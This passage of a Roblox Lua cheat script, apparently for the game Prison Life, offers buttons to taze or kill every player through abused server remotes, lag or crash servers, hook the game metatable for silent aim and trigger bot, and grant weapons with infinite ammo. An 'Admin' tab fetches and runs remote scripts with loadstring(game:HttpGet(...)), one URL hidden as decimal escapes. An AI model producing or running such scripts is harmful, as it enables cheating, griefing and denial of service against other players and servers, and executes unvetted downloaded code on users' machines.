waves.Position = UDim2.new(0.0201378968, 0, 0.646579564, 0)
waves.Size = UDim2.new(0, 111, 0, 26)
waves.Font = Enum.Font.GothamBold
waves.Text = "Fe Waves"
waves.TextColor3 = Color3.new(0, 0, 0)
waves.TextSize = 14
waves.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Bright blue")

local toolamount = 40 -- How long the tornado is
local tornadosize = 1 -- The size of how big the opening of the tornado is

local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
    workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
    for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
    if tool:IsA("Tool") then
            tool.Parent = LocalPlayer
        end
    end
    LocalPlayer.Character:ClearAllChildren()
    local char = Instance.new("Model", workspace)
    table.insert(characters, char)
    Instance.new("Humanoid", char)
    LocalPlayer.Character = char
    repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
    char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
    if tool:IsA("Tool") then
        tool.Parent = LocalPlayer.Backpack
        tool.Handle.Massless = false
        tool.Grip = CFrame.new(Vector3.new(0, math.sin(index + 0.5), index)) * CFrame.Angles(math.rad(tornadosize), 0, -index)
        tool.Parent = LocalPlayer.Character
        if tool.Handle:FindFirstChild("Mesh") ~= nil then
            tool.Handle.Mesh:Destroy()
        end
    end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
end)

bigbowl.Name = "bigbowl"
bigbowl.Parent = main
bigbowl.BackgroundColor3 = Color3.new(1, 1, 0)
bigbowl.Position = UDim2.new(0.341908664, 0, 0.647788644, 0)
bigbowl.Size = UDim2.new(0, 111, 0, 26)
bigbowl.Font = Enum.Font.GothamBold
bigbowl.Text = "Fe Big Bowl"
bigbowl.TextColor3 = Color3.new(0, 0, 0)
bigbowl.TextSize = 14
bigbowl.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Bright blue")

local toolamount = 250 -- How much covered the bowl is
local bowlsize = 20 -- How big the bowl is



local LocalPlayer = game:GetService("Players").LocalPlayer
local runservice = game:GetService("RunService")
local characters = {}
LocalPlayer.Character:FindFirstChild("Humanoid"):UnequipTools()
local currentamount = #LocalPlayer.Backpack:GetChildren()
LocalPlayer.Character.Archivable = true
local tempchar = LocalPlayer.Character:Clone()
tempchar.Parent = workspace
local savepos = LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame
local renderstepped = runservice.RenderStepped:Connect(function()
workspace.CurrentCamera.CameraSubject = tempchar:FindFirstChild("Humanoid")
for _, tool in pairs(LocalPlayer.Backpack:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer
end
end
LocalPlayer.Character:ClearAllChildren()
local char = Instance.new("Model", workspace)
table.insert(characters, char)
Instance.new("Humanoid", char)
LocalPlayer.Character = char
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character ~= nil
end)
repeat runservice.RenderStepped:Wait() until #LocalPlayer:GetChildren() - 4 - currentamount >= toolamount
renderstepped:Disconnect()
repeat runservice.RenderStepped:Wait() until LocalPlayer.Character:FindFirstChild("HumanoidRootPart") ~= nil
for _, char in pairs(characters) do
char:Destroy()
end
for index, tool in pairs(LocalPlayer:GetChildren()) do
if tool:IsA("Tool") then
tool.Parent = LocalPlayer.Backpack
tool.Handle.Massless = true
tool.Grip = CFrame.new(Vector3.new(math.sin(index * 0.1), bowlsize, 0)) * CFrame.Angles(math.sin(index * 0.1), index, 0)
tool.Parent = LocalPlayer.Character
if tool.Handle:FindFirstChild("Mesh") ~= nil then
tool.Handle.Mesh:Destroy()
end
end
end
LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = savepos
tempchar:Destroy()
LocalPlayer.Character:FindFirstChild("Humanoid").HipHeight = bowlsize
end)

tazeplrmain.Name = "tazeplrmain"
tazeplrmain.Parent = main
tazeplrmain.BackgroundColor3 = Color3.new(1, 0, 1)
tazeplrmain.Position = UDim2.new(0.358376801, 0, 0.83788842, 0)
tazeplrmain.Size = UDim2.new(0, 103, 0, 47)

tazetext.Name = "tazetext"
tazetext.Parent = tazeplrmain
tazetext.BackgroundColor3 = Color3.new(1, 0.666667, 1)
tazetext.Size = UDim2.new(0, 99, 0, 19)
tazetext.Font = Enum.Font.Gotham
tazetext.Text = "Player Name"
tazetext.TextColor3 = Color3.new(0, 0, 0)
tazetext.TextSize = 14

taze.Name = "taze"
taze.Parent = tazeplrmain
taze.BackgroundColor3 = Color3.new(0, 0, 0)
taze.Position = UDim2.new(0.128543824, 0, 0.510639191, 0)
taze.Size = UDim2.new(0, 80, 0, 22)
taze.Font = Enum.Font.GothamBold
taze.Text = "TAZE"
taze.TextColor3 = Color3.new(1, 1, 1)
taze.TextSize = 14
taze.MouseButton1Down:connect(function()
local A_1 = 
{
	[1] = 
{
	["RayObject"] = Ray.new(Vector3.new(829.838562, 101.489998, 2331.25635), Vector3.new(-30.6540909, -5.42795324, 95.0308533)), 
	["Distance"] = 15.355997085571, 
	["Cframe"] = CFrame.new(826.616699, 100.8508, 2340.11279, 0.964640439, -0.00993416365, -0.263382077, 9.31322575e-10, 0.999289393, -0.0376908854, 0.263569355, 0.0363581516, 0.963954985), 
	["Hit"] = game.Workspace[tazetext.Text].Torso
}
}
local A_2 = game.Players.LocalPlayer.Backpack["Taser"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)
end)

teamcrim.Name = "teamcrim"
teamcrim.Parent = main
teamcrim.BackgroundColor3 = Color3.new(1, 0, 0)
teamcrim.Position = UDim2.new(0.775380731, 0, 0.108776733, 0)
teamcrim.Size = UDim2.new(0, 83, 0, 22)
teamcrim.Font = Enum.Font.GothamBlack
teamcrim.Text = "Team Crim"
teamcrim.TextColor3 = Color3.new(0, 0, 0)
teamcrim.TextSize = 14
teamcrim.MouseButton1Down:connect(function()
wait(0.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-976.125183, 109.123924, 2059.99536)

wait(0.3)
game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(918.77,100,2379.07)
end)

tazeall.Name = "tazeall"
tazeall.Parent = main
tazeall.BackgroundColor3 = Color3.new(1, 0, 0)
tazeall.Position = UDim2.new(0.342309177, 0, 0.759402633, 0)
tazeall.Size = UDim2.new(0, 109, 0, 34)
tazeall.Font = Enum.Font.GothamBold
tazeall.Text = "Taze All"
tazeall.TextColor3 = Color3.new(0, 0, 0)
tazeall.TextSize = 14
tazeall.MouseButton1Down:connect(function()
workspace.Remote.TeamEvent:FireServer("Bright blue")

function kill(a)
local A_1 = 
{
	[1] = 
{
	["RayObject"] = Ray.new(Vector3.new(829.838562, 101.489998, 2331.25635), Vector3.new(-30.6540909, -5.42795324, 95.0308533)), 
	["Distance"] = 15.355997085571, 
	["Cframe"] = CFrame.new(826.616699, 100.8508, 2340.11279, 0.964640439, -0.00993416365, -0.263382077, 9.31322575e-10, 0.999289393, -0.0376908854, 0.263569355, 0.0363581516, 0.963954985), 
	["Hit"] = a.Character.Torso
}
}
local A_2 = game.Players.LocalPlayer.Backpack["Taser"]
local Event = game:GetService("ReplicatedStorage").ShootEvent
Event:FireServer(A_1, A_2)
end

for i,v in pairs(game.Players:GetChildren())do
if v.Name ~= game.Players.LocalPlayer.Name then
kill(v)
end
end
end)

removewalls.Name = "removewalls"
removewalls.Parent = main
removewalls.BackgroundColor3 = Color3.new(1, 0, 0)
removewalls.Position = UDim2.new(0.670628905, 0, 0.758472741, 0)
removewalls.Size = UDim2.new(0, 110, 0, 34)
removewalls.Font = Enum.Font.GothamBold
removewalls.Text = "Remove Walls"
removewalls.TextColor3 = Color3.new(0, 0, 0)
removewalls.TextSize = 14
removewalls.MouseButton1Down:connect(function()
wait(0.1)
game.Workspace.Prison_Guard_Outpost:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.building:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.glass:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.oven:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.shelves:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.vents:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.accents:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.vendingmachine:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.Prison_table1:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.counter:Remove()

wait(0.1)
game.Workspace.Prison_Cafeteria.boxes:Remove()
end)

removeall.Name = "removeall"
removeall.Parent = main
removeall.BackgroundColor3 = Color3.new(1, 0, 0)
removeall.Position = UDim2.new(0.673120499, 0, 0.838146329, 0)
removeall.Size = UDim2.new(0, 110, 0, 47)
removeall.Font = Enum.Font.GothamBold
removeall.Text = "Remove All"
removeall.TextColor3 = Color3.new(0, 0, 0)
removeall.TextSize = 14
removeall.MouseButton1Down:connect(function()
wait(0.1)
game.Workspace.Prison_Halls.walls:Remove()

wait(0.1)
game.Workspace.Prison_Halls.roof:Remove()

wait(0.1)
game.Workspace.Prison_Halls.outlines:Remove()

wait(0.1)
game.Workspace.Prison_Halls.lights:Remove()

wait(0.1)
Workspace.Prison_Halls.accent:Remove()

wait(0.1)
game.Workspace.Prison_Halls.glass:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.b_front:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.doors:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.c_tables:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.a_front:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.b_outerwall:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.c_wall:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.b_wall:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.c_hallwall:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.a_outerwall:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.b_ramp:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.a_ramp:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.a_walls:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.Cells_B:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.Cells_A:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.c_corner:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.Wedge:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.a_ceiling:Remove()

wait(0.1)
game.Workspace.Prison_Cellblock.b_ceiling:Remove()

wait(0.1)
game.Workspace.City_buildings:Remove()

wait(0.1)
game.Workspace.Prison_OuterWall:Remove()

wait(0.1)
game.Workspace.Prison_Fences:Remove()
end)

lagserver.Name = "lagserver"
lagserver.Parent = main
lagserver.BackgroundColor3 = Color3.new(0.333333, 0, 0.498039)
lagserver.Position = UDim2.new(0.66476965, 0, 0.659647882, 0)
lagserver.Size = UDim2.new(0, 120, 0, 42)
lagserver.Font = Enum.Font.GothamBold
lagserver.Text = "Lag Server (Swat)"
lagserver.TextColor3 = Color3.new(0, 1, 1)
lagserver.TextSize = 14
lagserver.MouseButton1Down:connect(function()
while true do
workspace.Remote.TeamEvent:FireServer("Bright blue")

for i = 10000,999999999999999,1 do
    for i,v in pairs(Workspace.Prison_ITEMS.clothes:GetChildren()) do
 
lol = Workspace.Remote.ItemHandler:InvokeServer(v.ITEMPICKUP)
print(lol)
end
end
end

end)
-- Scripts:
   end,
}) 

local Section = Tab:CreateSection("Aimbot")

local Button = Tab:CreateButton({
   Name = "Aimbot",
   Callback = function()
          --https://www.youtube.com/c/anto6666 
-- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ Modules ] --
local UserInterface = loadstring(game:HttpGet("https://raw.githubusercontent.com/icuck/collection-dump/main/AbstractUI", true))()
local Drawing = loadstring(game:HttpGet("https://raw.githubusercontent.com/iHavoc101/Genesis-Studios/main/Modules/DrawingAPI.lua", true))()

local ToolTip = require(Services.ReplicatedStorage.Modules_client.TooltipModule)

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- [ Raycast Parameters ] --
local RaycastParameters = RaycastParams.new()
RaycastParameters.IgnoreWater = true
RaycastParameters.FilterType = Enum.RaycastFilterType.Blacklist
RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

-- // Variables \\ --
-- [ Info ] --
local Info = {
   SilentAIMEnabled = false;
   TriggeredEnabled = false;
   ArmsCheckEnabled = true;
   TeamWhitelist = "";
   FieldOfView = 250;
}

local LastArrest = time()

-- [ Interface ] --
local FOVCircle = Drawing.new("Circle", {
   Thickness = 2.5,
   Color = Color3.fromRGB(200, 200, 200),
   NumSides = 25,
   Radius = _G.FOV
})

local Target = Drawing.new("Triangle", {
   Thickness = 5,
   Color = Color3.fromRGB(0, 200, 255)
})

-- [ Weapons ] --
local Weapons = {
   "Remington 870";
   "AK-47";
   "M9";
   "M4A1";
   "Hammer";
   "Crude Knife";
}

-- [ Metatable ] --
local RawMetatable = getrawmetatable(game)
local __NameCall = RawMetatable.__namecall
local __Index = RawMetatable.__index


-- // Functions \\ --
local function ValidCharacter(Character)
   return Character and (Character.FindFirstChildWhichIsA(Character, "Humanoid") and Character.FindFirstChildWhichIsA(Character, "Humanoid").Health ~= 0) or false
end

local function NotObstructing(Destination, Ancestor)
   -- [ Camera ] --
   local ObstructingParts = Camera.GetPartsObscuringTarget(Camera, {Destination}, {Ancestor, LocalPlayer.Character})

   for i,v in ipairs(ObstructingParts) do
       pcall(function()
           if v.Transparency >= 1 then
               table.remove(ObstructingParts, i)
           end
       end)
   end

   if #ObstructingParts <= 0 then
       return true
   end

   -- [ Raycast ] --
   RaycastParameters.FilterDescendantsInstances = {LocalPlayer.Character}

   local Origin = Camera.CFrame.Position
   local Direction = (Destination - Origin).Unit * 500
   local RayResult = workspace.Raycast(workspace, Origin, Direction, RaycastParameters) or {
       Instance = nil;
       Position = Origin + Direction;
       Material = Enum.Material.Air;
   }

   if RayResult.Instance and (RayResult.Instance.IsDescendantOf(RayResult.Instance, Ancestor) or RayResult.Instance == Ancestor) then
       return true
   end

   -- [ Obstructed ] --
   return false
end

local function IsArmed(Player)
   for i,v in ipairs(Weapons) do
       local Tool = Player.Backpack.FindFirstChild(Player.Backpack, v) or Player.Character.FindFirstChild(Player.Character, v)
       if Tool then
           return true
       end
   end
   return false
end

local function ClosestPlayerToCursor(Distance)
   local Closest = nil
   local Position = nil
   local ShortestDistance = Distance or math.huge

   local MousePosition = Services.UserInputService.GetMouseLocation(Services.UserInputService)

   for i, v in ipairs(Services.Players.GetPlayers(Services.Players)) do
       if v ~= LocalPlayer and (v.Team ~= LocalPlayer.Team and tostring(v.Team) ~= Info.TeamWhitelist) and ValidCharacter(v.Character) then
           if Info.ArmsCheckEnabled and (v.Team == Services.Teams.Inmates and IsArmed(v) == false) then
               continue
           end

           local ViewportPosition, OnScreen = Camera.WorldToViewportPoint(Camera, v.Character.PrimaryPart.Position)
           local Magnitude = (Vector2.new(ViewportPosition.X, ViewportPosition.Y) - MousePosition).Magnitude

           if OnScreen == false or NotObstructing(v.Character.PrimaryPart.Position, v.Character) == false then
               continue
           end

           if Magnitude < ShortestDistance  then
               Closest = v
               Position = ViewportPosition
               ShortestDistance = Magnitude
           end
       end
   end

   return Closest, Position
end

local function SwitchGuns()
   if LocalPlayer.Character.FindFirstChild(LocalPlayer.Character, "Remington 870") then
       local Tool = LocalPlayer.Backpack.FindFirstChild(LocalPlayer.Backpack, "M4A1") or LocalPlayer.Backpack.FindFirstChild(LocalPlayer.Backpack, "AK-47") or LocalPlayer.Backpack.FindFirstChild(LocalPlayer.Backpack, "M9")

       local Humanoid = LocalPlayer.Character.FindFirstChildWhichIsA(LocalPlayer.Character, "Humanoid")
       Humanoid.EquipTool(Humanoid, Tool)
   else
       local Tool = LocalPlayer.Backpack.FindFirstChild(LocalPlayer.Backpack, "Remington 870")

       local Humanoid = LocalPlayer.Character.FindFirstChildWhichIsA(LocalPlayer.Character, "Humanoid")
       Humanoid.EquipTool(Humanoid, Tool)
   end
end

local function Crash(Gun, BulletCount, ShotCount)
   local ShootEvent = Services.ReplicatedStorage.ShootEvent
   local StartTime = time()
   local BulletTable = {}

   for i = 1, BulletCount do
       BulletTable[i] = {
           Cframe = CFrame.new(),
           Distance = math.huge
       }
   end
   for i = 1, ShotCount do
       ShootEvent:FireServer(BulletTable, Gun)
       if time() - StartTime > 5 then
           break
       end
   end
end

-- // User Interface \\ --
-- [ Window ] --
local Window = UserInterface.new("Confinement X", UDim2.new(0, 420, 0, 420))

-- [ Assists ] --
Window:Divider("Assists")

Window:Toggle("Silent Aim", "Shoots toward the nearest player to your cursor.", false, function(State)
   Info.SilentAIMEnabled = State
end)

Window:Toggle("Trigger Bot", "Press G to temporarily disable.", false, function(State)
   Info.TriggeredEnabled = State
end)

Window:Slider("Field Of View", "Recommended: 250", 50, 500, 250, function(Value)
   Info.FieldOfView = Value
end)

Window:Dropdown("Team Whitelist", "Team for Silent-Aim to ignore.", {"Guards", "Inmates", "Criminals"}, function(Value)
   Info.TeamWhitelist = Value
end)

Window:Toggle("Danger Check", "Checks if an Inmate has gun.", false, function(State)
   Info.ArmsCheckEnabled = State
end)

-- [ Rage ] --
Window:Divider("Rage")

Window:Button("Kill All", "Kills everyone in-game", function()
   local GunScript = (LocalPlayer.Backpack:FindFirstChild("GunInterface", true) or LocalPlayer.Character:FindFirstChild("GunInterface", true))
   if GunScript then
       for i,v in ipairs(game.Players:GetPlayers()) do
           if v ~= LocalPlayer then
               local BulletInfo = {
                   [1] = {
                       ["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-391.152252, 8.65560055, -83.2166901)),
                       ["Distance"] = 3.2524313926697,
                       ["Cframe"] = CFrame.new(840.310791, 101.334137, 2267.87988, 0.0636406094, 0.151434347, -0.986416459, 0, 0.988420188, 0.151741937, 0.997972965, -0.00965694897, 0.0629036576),
                       ["Hit"] = v.Character.Head
                   },
                   [2] = {
                       ["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-392.481476, -8.44939327, -76.7261353)),
                       ["Distance"] = 3.2699294090271,
                       ["Cframe"] = CFrame.new(840.290466, 101.184189, 2267.93506, 0.0964837447, 0.0589403138, -0.993587971, 4.65661287e-10, 0.998245299, 0.0592165813, 0.995334625, -0.00571343815, 0.0963144377),
                       ["Hit"] = v.Character.Head
                   },
                   [3] = {
                       ["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-389.21701, -2.50536323, -92.2163162)),
                       ["Distance"] = 3.1665518283844,
                       ["Cframe"] = CFrame.new(840.338867, 101.236496, 2267.80371, 0.0166504811, 0.0941716284, -0.995416701, 1.16415322e-10, 0.995554805, 0.0941846818, 0.999861419, -0.00156822044, 0.0165764652),
                       ["Hit"] = v.Character.Head
                   },
                   [4] = {
                       ["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-393.353973, 3.13988972, -72.5452042)),
                       ["Distance"] = 3.3218522071838,
                       ["Cframe"] = CFrame.new(840.277222, 101.285957, 2267.9707, 0.117109694, 0.118740402, -0.985994935, -1.86264515e-09, 0.992826641, 0.119563118, 0.993119001, -0.0140019981, 0.116269611),
                       ["Hit"] = v.Character.Head
                   },
                   [5] = {
                       ["RayObject"] = Ray.new(Vector3.new(845.555908, 101.429337, 2269.43945), Vector3.new(-390.73172, 3.2097764, -85.5477524)),
                       ["Distance"] = 3.222757101059,
                       ["Cframe"] = CFrame.new(840.317993, 101.286423, 2267.86035, 0.0517584644, 0.123365127, -0.991010666, 0, 0.992340803, 0.123530701, 0.99865967, -0.00639375951, 0.0513620302),
                       ["Hit"] = v.Character.Head
                   }
               }
               Services.ReplicatedStorage.ShootEvent:FireServer(BulletInfo, GunScript.Parent)
               Services.ReplicatedStorage.ShootEvent:FireServer(BulletInfo, GunScript.Parent)
           end
       end
   else
       ToolTip.update("No gun found!")
   end
end)

Window:Button("Gun Modification", "Modifies the current gun you are holding.", function()
   local GunStates = LocalPlayer.Character:FindFirstChild("GunStates", true)
   if GunStates then
       local GunInfo = require(GunStates)
       GunInfo.ReloadTime = 0
       GunInfo.FireRate = 0
       GunInfo.AutoFire = true
       GunInfo.StoredAmmo = math.huge
       GunInfo.MaxAmmo = math.huge
       GunInfo.CurrentAmmo = math.huge
   end
end)

-- [ Miscellaneous ] --
Window:Divider("Miscellaneous")

Window:Button("Get Guns", "Grabs all", function()
   local HasSWAT = Services.MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, 96651)

   workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["Remington 870"].ITEMPICKUP)
   if HasSWAT then
       workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M4A1"].ITEMPICKUP)
   end
   workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["AK-47"].ITEMPICKUP)
   workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.giver["M9"].ITEMPICKUP)

   if HasSWAT then
       workspace.Remote.ItemHandler:InvokeServer(workspace.Prison_ITEMS.clothes["Riot Police"].ITEMPICKUP)
   end
end)

-- [ Credits ] --
Window:Divider("Credits")

Window:Button("OminousVibes#7259", "Script Creator", function()
   setclipboard("OminousVibes#7259")
end)


-- // Metatable \\ --
setreadonly(RawMetatable, false)

RawMetatable.__index = newcclosure(function(Self, Index)
   if Info.SilentAIMEnabled == true and checkcaller() == false then
       if typeof(Self) == "Instance" and (Self:IsA("PlayerMouse") or Self:IsA("Mouse")) then
           if Index == "Hit" then
               local Closest = ClosestPlayerToCursor(Info.FieldOfView)
               if Closest then
                   local Velocity = Closest.Character.PrimaryPart.AssemblyLinearVelocity
                   local Prediction = Velocity.Unit
                   if Velocity.Magnitude == 0 then
                       Prediction = Vector3.new(0, 0, 0)
                   end
                   return CFrame.new(Closest.Character.Head.Position + Prediction)
               end
           end
       end
   end

   return __Index(Self, Index)
end)


setreadonly(RawMetatable, true)

-- // Event Listeners \\ --
Services.RunService.RenderStepped:Connect(function()
   if Info.SilentAIMEnabled == true then
       -- FOV --
       FOVCircle.Visible = true
       FOVCircle.Radius = Info.FieldOfView
       FOVCircle.Position = Services.UserInputService:GetMouseLocation()

       -- Target --
       local Closest, Position = ClosestPlayerToCursor(Info.FieldOfView)
       if Closest then
           Target.PointA = Vector2.new(Position.X - 25, Position.Y + 25)
           Target.PointB = Vector2.new(Position.X + 25, Position.Y + 25)
           Target.PointC = Vector2.new(Position.X, Position.Y - 25)
           if Info.TriggeredEnabled and not Services.UserInputService:IsKeyDown(Enum.KeyCode.G) then
               mouse1click()
           end
       end
       Target.Visible = Closest ~= nil
   else
       FOVCircle.Visible = false
       Target.Visible = false
   end
end)

LocalPlayer.Chatted:Connect(function(Message)
   if string.find(Message:lower(), "-lag") then
       local GunScript = (LocalPlayer.Backpack:FindFirstChild("GunInterface", true) or LocalPlayer.Character:FindFirstChild("GunInterface", true))
       if GunScript then
           ToolTip.update("Lagging...")
           Crash(GunScript.Parent, 100, 10)
           ToolTip.update("Lagged!")
       else
          ToolTip.update("Error: No gun found!")
       end
   end
end)

local LastShotDetected = time()
for i,v in ipairs(getconnections(Services.ReplicatedStorage.ReplicateEvent.OnClientEvent)) do
   local OldFunction = v.Function
   v.Function = function(BulletStats, IsTaser)
       if #BulletStats > 25 or time() - LastShotDetected > 0.02 then
           ToolTip.update("Bullet Overload: Removing...")
           return
       end
       LastShotDetected = time()
       OldFunction(BulletStats, IsTaser)
   end
end

local LastSoundDetected = time()
for i,v in ipairs(getconnections(Services.ReplicatedStorage.SoundEvent.OnClientEvent)) do
   local OldFunction = v.Function
   v.Function = function(Sound)
       if time() - LastSoundDetected > 0.02 then
           ToolTip.update("Audio Overload: Removing...")
           return
       end
       LastSoundDetected = time()
       OldFunction(Sound)
   end
end


-- // KeyBinds \\ --
Services.UserInputService.InputBegan:Connect(function(Input, GameProcessed)
   if _G.ArrestAssist == false or GameProcessed or LocalPlayer.Character:FindFirstChild("Handcuffs") == nil then
       return
   end

   local Delta = time() - LastArrest
   if Delta <= 15 then
       ToolTip.update("Wait " .. tostring(math.floor(Delta)) .. " seconds before arresting again!")
   end

   if Input.UserInputType == Enum.UserInputType.MouseButton1 then
       local Closest = ClosestPlayerToCursor(_G.FOV)
       if Closest then
           local Result = workspace.Remote.arrest:InvokeServer(Closest.Character.HumanoidRootPart)
           ToolTip.update(Result == true and "Successfully arrested!" or Result)
           if Result == true then
               LastArrest = time()
           end
       end
   end
end)

Services.ContextActionService:BindAction("Switch Bind", function(actionName, InputState, inputObject)
if InputState == Enum.UserInputState.End then
return
   end
   pcall(SwitchGuns)
end, false, Enum.KeyCode.Q)

-- // Actions \\ --
LocalPlayer.PlayerGui.Home.fadeFrame.Visible = false

return {};
   end,
}) 

local Button = Tab:CreateButton({
   Name = "100% shoots on Player",
   Callback = function()
          local Players = game.Players
local LocalPlayer = Players.LocalPlayer
local GetPlayers = Players.GetPlayers
local Camera = workspace.CurrentCamera
local WTSP = Camera.WorldToScreenPoint
local FindFirstChild = game.FindFirstChild
local Vector2_new = Vector2.new
local Mouse = LocalPlayer.GetMouse(LocalPlayer)
function ClosestChar()
    local Max, Close = math.huge
    for I,V in pairs(GetPlayers(Players)) do
        if V ~= LocalPlayer and V.Team ~= LocalPlayer.Team and V.Character then
            local Torso = FindFirstChild(V.Character, "Torso")
            if Torso then
                local Pos, OnScreen = WTSP(Camera, Torso.Position)
                if OnScreen then
                    local Dist = (Vector2_new(Pos.X, Pos.Y) - Vector2_new(Mouse.X, Mouse.Y)).Magnitude
                    if Dist < Max then
                        Max = Dist
                        Close = V.Character
                    end
                end
            end
        end
    end
    return Close
end

local MT = getrawmetatable(game)
local __namecall = MT.__namecall
setreadonly(MT, false)
MT.__namecall = newcclosure(function(self, ...)
    local Method = getnamecallmethod()
    if Method == "FindPartOnRay" and not checkcaller() and tostring(getfenv(0).script) == "GunInterface" then
        local Character = ClosestChar()
        if Character then
            return Character.Torso, Character.Torso.Position
        end
    end

    return __namecall(self, ...)
end)
setreadonly(MT, true)
local vu = game:GetService("VirtualUser")
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)
 
game.StarterGui:SetCore("SendNotification", {
    Title = "Subscribe To AlexScripterUnfounded";
    Text = "modified by AlexScripterUnfounded"; -- what the text says (ofc)
    Duration = 20;
})
wait(1)
game.StarterGui:SetCore("SendNotification", {
    Title = "Yeah Boy";
    Text = "Enjoy"; -- what the text says (ofc)
    Duration = 20;
})
   end,
})

local Tab = Window:CreateTab("Admin Universal", 4483362458)

local Section = Tab:CreateSection("Admins")

local Button = Tab:CreateButton({
   Name = "Reviz Admin",
   Callback = function()
          loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N",true))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "IY Admin",
   Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Leg Admin",
   Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/leg1337/legadmv2/main/legadminv2.lua'))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Cmd X",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source",true))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Fates Admin",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/fatesc/fates-admin/main/main.lua"))();
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Iv Admin",
   Callback = function()
          loadstring(game:HttpGet('\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\79\109\110\105\112\111\116\101\110\99\101\68\101\118\101\108\111\112\101\114\47\78\117\109\98\101\114\47\109\97\105\110\47\49\46\108\117\97'))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "NameLess Admin",
   Callback = function()
          loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-Nameless-Admin-10833"))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Comet Admin",
   Callback = function()
          
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Simple Admin",
   Callback = function()
          loadstring(game:HttpGet('https://pastebin.com/raw/3hDQcTaD'))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "MyWorld |Panel| Admin",
   Callback = function()
